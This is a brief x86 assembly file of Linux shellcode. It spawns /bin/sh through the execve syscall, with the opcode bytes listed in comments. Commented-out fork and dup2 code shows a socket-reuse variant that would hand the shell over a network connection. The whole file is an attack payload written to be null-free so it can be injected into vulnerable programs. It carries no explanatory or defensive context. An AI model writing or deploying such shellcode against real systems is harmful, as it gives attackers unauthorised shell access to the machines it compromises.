# Author: Victor BUSA

.globl main
	.type	main, @function

#"\x31\xd2\x31\xc0"
#"\x31\xc9\xb0\x0b\x52\x68\x2f\x2f"
#"\x73\x68\x68\x2f\x62\x69\x6e\x89"
#"\xe3\x52\x89\xe2\x53\x89\xe1\xcd"
#"\x80";

main:
#push $0x02			# syscall for fork
#pop %eax
#int $0x80			# call fork --> cause %eax = 0


#push $0x08			# value of socket = 8
#pop %ebx			# put the value of the socket in %ebx

#dup2(socket, i) where i = 0, 1 then 2;
xor %edx, %edx			# %edx to 0
xor %eax, %eax			# %eax to 0
xor %ecx, %ecx
#mov $0x2, %cl			# count and %ecx = 2, 1, 0
#dup2:
#	movb $0x3f, %al	 	# dup2()
#	int $0x80 		# call dup2()
#	dec %ecx 		# decr %ecx
#	jns dup2


#execve("/bin/sh", ["/bin//sh", NULL], NULL);
mov $11, %al			# execve
push %edx			# Null at the end of the string
push $0x68732f2f		# "//sh" $0x68732f2f
push $0x6e69622f		# "/bin"
mov %esp, %ebx			# address of "/bin//sh\0" in %ebx
push %edx			# push NULL
mov %esp, %edx			# tab empty (3)
push %ebx			# push addess of "/bin//sh"
mov %esp, %ecx			# argv (2)
int $0x80
